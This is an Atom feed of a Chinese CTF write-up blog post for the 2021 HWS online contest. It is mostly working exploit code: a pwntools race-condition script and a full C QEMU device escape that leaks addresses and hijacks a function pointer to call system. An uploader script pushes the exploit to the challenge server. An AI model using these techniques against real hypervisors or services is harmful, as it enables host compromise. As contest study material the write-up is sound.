<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>nuoye&#39;s blog</title>
  
  <subtitle>nuoye</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://nuoye-blog.github.io/"/>
  <updated>2021-08-24T06:41:28.987Z</updated>
  <id>https://nuoye-blog.github.io/</id>
  
  <author>
    <name>nuoye</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>2021HWS线上赛-WP</title>
    <link href="https://nuoye-blog.github.io/2021/08/24/ffdb87e5/"/>
    <id>https://nuoye-blog.github.io/2021/08/24/ffdb87e5/</id>
    <published>2021-08-24T07:00:00.000Z</published>
    <updated>2021-08-24T06:41:28.987Z</updated>
    
    <content type="html"><![CDATA[<h1 id="2021HWS线上赛-WP"><a href="#2021HWS线上赛-WP" class="headerlink" title="2021HWS线上赛-WP"></a>2021HWS线上赛-WP</h1><h2 id="shop"><a href="#shop" class="headerlink" title="shop"></a>shop</h2><p>存在条件竞争，可以多次卖出高价值物品，重复即可得到249元从而购买flag。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">"./pwn"</span>)</span><br><span class="line">p = remote(<span class="string">"node4.buuoj.cn"</span>,<span class="string">"27664"</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">buy</span><span class="params">(idx)</span>:</span></span><br><span class="line">p.sendline(<span class="string">"2"</span>.ljust(<span class="number">0xf</span>,<span class="string">'\x00'</span>))</span><br><span class="line">p.sendline(str(idx).ljust(<span class="number">0xf</span>,<span class="string">'\x00'</span>))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">look</span><span class="params">()</span>:</span></span><br><span class="line">p.sendline(<span class="string">"1"</span>.ljust(<span class="number">0xf</span>,<span class="string">'\x00'</span>))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sell</span><span class="params">(idx)</span>:</span></span><br><span class="line">p.sendline(<span class="string">"3"</span>.ljust(<span class="number">0xf</span>,<span class="string">'\x00'</span>))</span><br><span class="line">p.sendline(str(idx).ljust(<span class="number">0xf</span>,<span class="string">'\x00'</span>))</span><br><span class="line">buy(<span class="number">2</span>)</span><br><span class="line">sell(<span class="number">2</span>)</span><br><span class="line">buy(<span class="number">1</span>)</span><br><span class="line">sell(<span class="number">2</span>)</span><br><span class="line"><span class="comment">#sleep(1)</span></span><br><span class="line"><span class="comment">#buy(1)</span></span><br><span class="line">look()</span><br><span class="line">p.interactive()</span><br><span class="line"><span class="comment">#flag&#123;97d3afe8-8139-4219-801c-4f25418e73ac&#125;</span></span><br></pre></td></tr></table></figure><h2 id="FastCP"><a href="#FastCP" class="headerlink" title="FastCP"></a>FastCP</h2><p>qemu题目，根据launch.sh文件中<code>--device FastCP</code>确定关键词，再通过在ida里面搜索即可得到相关函数。</p><p>漏洞点存在于fastcp_cp_timer函数中：</p><ul><li>当cmd为4时，可以读取超出CP_buffer范围得到cp_timer函数指针的值</li><li>当cmd为1且CP_list_cnt大于0x10时，可以覆盖到cp_timer函数指针及其参数的地址</li></ul><p>通过cmd为4进行泄漏得到pie地址和CP_buffer，再通过cmd为1设置cp_timer为system函数地址，并覆盖其指向CP_buffer上存储命令的地址，再次执行即可获取flag。</p><p>exp：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PAGE_SHIFT  12</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PAGE_SIZE   (1 &lt;&lt; PAGE_SHIFT)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PFN_PRESENT (1ull &lt;&lt; 63)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PFN_PFN     ((1ull &lt;&lt; 55) - 1)</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span>* mmio_mem;</span><br><span class="line"><span class="keyword">char</span> *userbuf;</span><br><span class="line"><span class="keyword">char</span> *dst;</span><br><span class="line"><span class="keyword">char</span> *src;</span><br><span class="line"><span class="keyword">uint64_t</span> phy_userbuf;</span><br><span class="line"><span class="keyword">uint64_t</span> phy_dst;</span><br><span class="line"><span class="keyword">uint64_t</span> phy_dst2;</span><br><span class="line"><span class="keyword">uint64_t</span> phy_src;</span><br><span class="line"><span class="keyword">uint64_t</span> phy_src2;</span><br><span class="line"><span class="keyword">uint64_t</span> pie_base;</span><br><span class="line"><span class="keyword">uint64_t</span> libc_base;</span><br><span class="line"></span><br><span class="line"><span class="keyword">asm</span>(</span><br><span class="line">    <span class="string">"execve:\n"</span></span><br><span class="line"><span class="string">"mov $59,%rax\n"</span></span><br><span class="line"><span class="string">"syscall\n"</span></span><br><span class="line"><span class="string">"ret\n"</span></span><br><span class="line"></span><br><span class="line"><span class="string">"open:\n"</span></span><br><span class="line"><span class="string">"mov $2,%rax\n"</span></span><br><span class="line"><span class="string">"syscall\n"</span></span><br><span class="line"><span class="string">"ret\n"</span></span><br><span class="line"></span><br><span class="line"><span class="string">"read:\n"</span></span><br><span class="line"><span class="string">"mov $0,%rax\n"</span></span><br><span class="line"><span class="string">"syscall\n"</span></span><br><span class="line"><span class="string">"ret\n"</span></span><br><span class="line"></span><br><span class="line"><span class="string">"write:\n"</span></span><br><span class="line"><span class="string">"mov $1,%rax\n"</span></span><br><span class="line"><span class="string">"syscall\n"</span></span><br><span class="line"><span class="string">"ret\n"</span></span><br><span class="line"></span><br><span class="line"><span class="string">"exit:\n"</span></span><br><span class="line"><span class="string">"mov $60,%rax\n"</span></span><br><span class="line"><span class="string">"syscall\n"</span></span><br><span class="line"><span class="string">"ret\n"</span></span><br><span class="line"></span><br><span class="line">        <span class="string">"mmap:\n"</span></span><br><span class="line"><span class="string">"push %rcx\n"</span></span><br><span class="line"><span class="string">"pop %r10\n"</span></span><br><span class="line"><span class="string">"mov $9,%rax\n"</span></span><br><span class="line"><span class="string">"syscall\n"</span></span><br><span class="line"><span class="string">"ret\n"</span></span><br><span class="line"></span><br><span class="line"><span class="string">"sleep:\n"</span></span><br><span class="line"><span class="string">"mov $230,%rax\n"</span></span><br><span class="line"><span class="string">"syscall\n"</span></span><br><span class="line"><span class="string">"ret\n"</span></span><br><span class="line"></span><br><span class="line"><span class="string">"lseek:\n"</span></span><br><span class="line"><span class="string">"mov $8,%rax\n"</span></span><br><span class="line"><span class="string">"syscall\n"</span></span><br><span class="line"><span class="string">"ret\n"</span></span><br><span class="line"></span><br><span class="line"><span class="string">"close:\n"</span></span><br><span class="line"><span class="string">"mov $3,%rax\n"</span></span><br><span class="line"><span class="string">"syscall\n"</span></span><br><span class="line"><span class="string">"ret\n"</span></span><br><span class="line"></span><br><span class="line"><span class="string">"mlock:\n"</span></span><br><span class="line"><span class="string">"mov $149,%rax\n"</span></span><br><span class="line"><span class="string">"syscall\n"</span></span><br><span class="line"><span class="string">"ret\n"</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cpu_info</span>&#123;</span></span><br><span class="line"><span class="keyword">uint64_t</span> CP_list_src;</span><br><span class="line"><span class="keyword">uint64_t</span> CP_list_cnt;</span><br><span class="line"><span class="keyword">uint64_t</span> CP_list_dst;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uint64_t</span> <span class="title">page_offset</span><span class="params">(<span class="keyword">uint64_t</span> addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> addr &amp; ((<span class="number">1</span> &lt;&lt; PAGE_SHIFT) - <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uint64_t</span> <span class="title">gva_to_gfn</span><span class="params">(<span class="keyword">void</span> *addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">uint64_t</span> pme, gfn;</span><br><span class="line">    <span class="keyword">size_t</span> offset;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> fd = <span class="built_in">open</span>(<span class="string">"/proc/self/pagemap"</span>, <span class="number">0</span>);</span><br><span class="line">    offset = ((<span class="keyword">uintptr_t</span>)addr &gt;&gt; <span class="number">9</span>) &amp; ~<span class="number">7</span>;</span><br><span class="line">    lseek(fd, offset, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">read</span>(fd, &amp;pme, <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">if</span> (!(pme &amp; PFN_PRESENT))</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    gfn = pme &amp; PFN_PFN;</span><br><span class="line">    <span class="built_in">close</span>(fd);</span><br><span class="line">    <span class="keyword">return</span> gfn;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uint64_t</span> <span class="title">gva_to_gpa</span><span class="params">(<span class="keyword">void</span> *addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">uint64_t</span> gfn = gva_to_gfn(addr);</span><br><span class="line">    <span class="comment">//assert(gfn != -1);</span></span><br><span class="line">    <span class="keyword">return</span> (gfn &lt;&lt; PAGE_SHIFT) | page_offset((<span class="keyword">uint64_t</span>)addr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">mmio_write</span><span class="params">(<span class="keyword">uint64_t</span> addr, <span class="keyword">uint64_t</span> value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    *((<span class="keyword">uint64_t</span>*)(mmio_mem + addr)) = value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">set_cp_list_src</span><span class="params">(<span class="keyword">uint64_t</span> value)</span></span>&#123;</span><br><span class="line">mmio_write(<span class="number">8</span>,value);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">set_cp_list_cnt</span><span class="params">(<span class="keyword">uint64_t</span> value)</span></span>&#123;</span><br><span class="line">mmio_write(<span class="number">16</span>,value);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">do_cp</span><span class="params">(<span class="keyword">uint64_t</span> value)</span></span>&#123;</span><br><span class="line">mmio_write(<span class="number">24</span>,value);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uint64_t</span> <span class="title">mmio_read</span><span class="params">(<span class="keyword">uint64_t</span> addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> *((<span class="keyword">uint64_t</span>*)(mmio_mem + addr));</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">uint64_t</span> <span class="title">read_cmd</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> mmio_read(<span class="number">24</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">uint64_t</span> <span class="title">read_cp_list_src</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> mmio_read(<span class="number">8</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">uint64_t</span> <span class="title">read_handling</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> mmio_read(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">uint64_t</span> <span class="title">read_cp_list_cnt</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> mmio_read(<span class="number">16</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">write</span>(<span class="number">1</span>,<span class="string">"start\n"</span>,<span class="number">6</span>);</span><br><span class="line">    <span class="comment">// Open and map I/O memory for the strng device</span></span><br><span class="line">    <span class="keyword">int</span> mmio_fd = <span class="built_in">open</span>(<span class="string">"/sys/devices/pci0000:00/0000:00:04.0/resource0"</span>, <span class="number">0x101002</span>);<span class="comment">//fea00000</span></span><br><span class="line"></span><br><span class="line">    mmio_mem = mmap(<span class="number">0</span>, <span class="number">0x1000</span>, <span class="number">3</span>, <span class="number">1</span>, mmio_fd, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//printf("mmio_mem @ %p\n", mmio_mem);</span></span><br><span class="line">        <span class="comment">// Allocate DMA buffer and obtain its physical address</span></span><br><span class="line">    userbuf = mmap(<span class="number">0</span>, <span class="number">0x1000</span>, <span class="number">3</span>, <span class="number">33</span>, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    mlock(userbuf, <span class="number">0x1000</span>);</span><br><span class="line">    phy_userbuf=gva_to_gpa(userbuf);</span><br><span class="line">    <span class="comment">//printf("user buff virtual address: %p\n",userbuf);</span></span><br><span class="line">    <span class="comment">//printf("user buff physical address: %p\n",(void*)phy_userbuf);</span></span><br><span class="line">    <span class="keyword">do</span>&#123;</span><br><span class="line">    dst = mmap(<span class="number">0</span>, <span class="number">0x2000</span>, <span class="number">3</span>, <span class="number">33</span>, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    mlock(dst, <span class="number">0x2000</span>);</span><br><span class="line">    phy_dst=gva_to_gpa(dst);</span><br><span class="line">    phy_dst2=gva_to_gpa(dst+<span class="number">0x1000</span>);</span><br><span class="line">    &#125;<span class="keyword">while</span>((phy_dst2 - phy_dst != <span class="number">0x1000</span>));</span><br><span class="line">    <span class="comment">//printf("user buff virtual address: %p\n",dst);</span></span><br><span class="line">    <span class="comment">//printf("user buff physical address: %p\n",(uint64_t*)phy_dst);</span></span><br><span class="line">    <span class="comment">//printf("user buff physical address2: %p\n",(uint64_t*)phy_dst2);</span></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">do</span>&#123;</span><br><span class="line">    src = mmap(<span class="number">0</span>, <span class="number">0x2000</span>, <span class="number">3</span>, <span class="number">33</span>, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    mlock(src, <span class="number">0x2000</span>);</span><br><span class="line">    phy_src=gva_to_gpa(src);</span><br><span class="line">    phy_src2=gva_to_gpa(src+<span class="number">0x1000</span>);</span><br><span class="line">    &#125;<span class="keyword">while</span>((phy_src2 - phy_src != <span class="number">0x1000</span>));</span><br><span class="line">    <span class="comment">//printf("user buff virtual address: %p\n",src);</span></span><br><span class="line">    <span class="comment">//printf("user buff physical address: %p\n",(uint64_t*)phy_src);</span></span><br><span class="line">    <span class="comment">//printf("user buff physical address2: %p\n",(uint64_t*)phy_src2);</span></span><br><span class="line">    </span><br><span class="line">    <span class="built_in">write</span>(<span class="number">1</span>,<span class="string">"step2\n"</span>,<span class="number">6</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">int</span> index = <span class="number">0</span>;</span><br><span class="line">    ((struct cpu_info*)userbuf)-&gt;CP_list_src= phy_src;</span><br><span class="line">    ((struct cpu_info*)userbuf)-&gt;CP_list_cnt= <span class="number">0x100</span>;</span><br><span class="line">    ((struct cpu_info*)userbuf)-&gt;CP_list_dst= phy_dst;</span><br><span class="line">    ((<span class="keyword">uint64_t</span>*)src)[<span class="number">0</span>]=<span class="number">0x123456</span>;</span><br><span class="line">    ((<span class="keyword">uint64_t</span>*)src)[<span class="number">1</span>]=<span class="number">0x123456</span>;</span><br><span class="line">    <span class="comment">//0x7f3fd4000000</span></span><br><span class="line">    </span><br><span class="line">    set_cp_list_cnt(<span class="number">1</span>);</span><br><span class="line">    set_cp_list_src(phy_userbuf);</span><br><span class="line">    do_cp(<span class="number">2</span>);</span><br><span class="line">    <span class="keyword">while</span>(read_cmd())&#123;</span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    ((struct cpu_info*)userbuf)-&gt;CP_list_cnt= <span class="number">0x1020</span>;</span><br><span class="line">    </span><br><span class="line">    set_cp_list_src(phy_userbuf);</span><br><span class="line">    </span><br><span class="line">    do_cp(<span class="number">4</span>);</span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">while</span>(read_cmd())&#123;</span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    pie_base = *(<span class="keyword">uint64_t</span>*)(dst+<span class="number">0x1010</span>) - <span class="number">0x4dce80</span>;</span><br><span class="line">    <span class="comment">//printf("pie_base : %p\n",pie_base);</span></span><br><span class="line">    </span><br><span class="line">    <span class="built_in">write</span>(<span class="number">1</span>,&amp;pie_base,<span class="number">8</span>);</span><br><span class="line">    <span class="built_in">write</span>(<span class="number">1</span>,<span class="string">"step3\n"</span>,<span class="number">6</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">uint64_t</span> system = <span class="number">0x2C2180</span> + pie_base;</span><br><span class="line">    <span class="keyword">uint64_t</span> sh = (*(<span class="keyword">uint64_t</span>*)(dst+<span class="number">0x1018</span>));</span><br><span class="line">    ((struct cpu_info*)userbuf)-&gt;CP_list_src= phy_src;</span><br><span class="line">    ((struct cpu_info*)userbuf)-&gt;CP_list_cnt= <span class="number">0x1020</span>;</span><br><span class="line">    ((struct cpu_info*)userbuf)-&gt;CP_list_dst= phy_dst;</span><br><span class="line">    </span><br><span class="line">    (*(<span class="keyword">uint64_t</span>*)(src+<span class="number">0x1000</span>))=(*(<span class="keyword">uint64_t</span>*)(dst+<span class="number">0x1000</span>));</span><br><span class="line">    (*(<span class="keyword">uint64_t</span>*)(src+<span class="number">0x1008</span>))=(*(<span class="keyword">uint64_t</span>*)(dst+<span class="number">0x1008</span>));</span><br><span class="line">    (*(<span class="keyword">uint64_t</span>*)(src+<span class="number">0x1010</span>))=(*(<span class="keyword">uint64_t</span>*)(dst+<span class="number">0x1010</span>));</span><br><span class="line">    (*(<span class="keyword">uint64_t</span>*)(src+<span class="number">0x1018</span>))=(*(<span class="keyword">uint64_t</span>*)(dst+<span class="number">0x1018</span>));</span><br><span class="line">    (*(<span class="keyword">uint64_t</span>*)(src+<span class="number">0x1010</span>))=system;</span><br><span class="line">    (*(<span class="keyword">uint64_t</span>*)(src+<span class="number">0x1018</span>))=sh+<span class="number">0xa00</span>+<span class="number">0x100</span>;</span><br><span class="line">    (*(<span class="keyword">char</span>*)(src+<span class="number">0x100</span>))=<span class="string">'c'</span>;</span><br><span class="line">    (*(<span class="keyword">char</span>*)(src+<span class="number">0x101</span>))=<span class="string">'a'</span>;</span><br><span class="line">    (*(<span class="keyword">char</span>*)(src+<span class="number">0x102</span>))=<span class="string">'t'</span>;</span><br><span class="line">    (*(<span class="keyword">char</span>*)(src+<span class="number">0x103</span>))=<span class="string">' '</span>;</span><br><span class="line">    (*(<span class="keyword">char</span>*)(src+<span class="number">0x104</span>))=<span class="string">'/'</span>;</span><br><span class="line">    (*(<span class="keyword">char</span>*)(src+<span class="number">0x105</span>))=<span class="string">'f'</span>;</span><br><span class="line">    (*(<span class="keyword">char</span>*)(src+<span class="number">0x106</span>))=<span class="string">'l'</span>;</span><br><span class="line">    (*(<span class="keyword">char</span>*)(src+<span class="number">0x107</span>))=<span class="string">'a'</span>;</span><br><span class="line">    (*(<span class="keyword">char</span>*)(src+<span class="number">0x108</span>))=<span class="string">'g'</span>;</span><br><span class="line">    set_cp_list_cnt(<span class="number">0x11</span>);</span><br><span class="line">    set_cp_list_src(phy_userbuf);</span><br><span class="line">    </span><br><span class="line">    do_cp(<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">while</span>(read_cmd())&#123;</span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//printf("system_addr : %p\n",*(uint64_t*)(dst));</span></span><br><span class="line">    do_cp(<span class="number">1</span>);</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上传：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># encoding: utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">os.system(<span class="string">'gcc -e main -static ./exp.c -o ./exp -nostdlib'</span>)</span><br><span class="line">os.system(<span class="string">'strip ./exp'</span>)</span><br><span class="line">os.system(<span class="string">'upx ./exp'</span>)</span><br><span class="line">f = open(<span class="string">"exp"</span>, <span class="string">"rb"</span>)</span><br><span class="line">exp = f.read()</span><br><span class="line">f.close()</span><br><span class="line">print(len(exp))</span><br><span class="line">step = <span class="number">0x200</span></span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">'118.195.171.57'</span>,  <span class="number">443</span>)</span><br><span class="line">r.recvuntil(<span class="string">'VMEscape login:'</span>)</span><br><span class="line">r.sendline(<span class="string">'root'</span>)</span><br><span class="line">r.recvuntil(<span class="string">'#'</span>)</span><br><span class="line">r.sendline(<span class="string">''</span>)</span><br><span class="line"></span><br><span class="line">log.info(<span class="string">'uploading...'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(exp)/step+<span class="number">1</span>):</span><br><span class="line">    b64_exp = base64.b64encode(exp[step*i:step*(i+<span class="number">1</span>)])</span><br><span class="line">    r.recvuntil(<span class="string">'#'</span>)</span><br><span class="line">    r.sendline(<span class="string">'echo %s &gt;&gt; ./b64_exp'</span>%b64_exp)</span><br><span class="line">log.success(<span class="string">'upload success'</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">'#'</span>)</span><br><span class="line">r.sendline(<span class="string">'base64 -d ./b64_exp &gt; ./exp'</span>)</span><br><span class="line">r.recvuntil(<span class="string">'#'</span>)</span><br><span class="line">r.sendline(<span class="string">'chmod 777 exp'</span>)</span><br><span class="line">r.recvuntil(<span class="string">'#'</span>)</span><br><span class="line">r.sendline(<span class="string">'./exp'</span>)</span><br><span class="line"></span><br><span 